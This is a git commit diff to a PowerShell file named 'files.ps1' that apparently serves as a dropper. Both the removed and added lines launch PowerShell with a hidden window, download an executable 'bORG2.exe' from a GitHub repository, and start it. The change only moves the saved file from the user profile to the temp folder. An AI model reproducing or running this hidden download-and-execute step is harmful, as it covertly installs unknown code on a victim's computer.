668039660c3439e3e883f9586fed76cdf892a5af
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-02 12:48:42 -0600

    Update files.ps1

--- files.ps1
+++ files.ps1
@@ -1,3 +1,3 @@
-powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:USERPROFILE\bORG2.exe
-start-process "$env:USERPROFILE\bORG2.exe"
+powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:TMP\bORG2.exe
+start-process "$env:TMP\bORG2.exe"
 
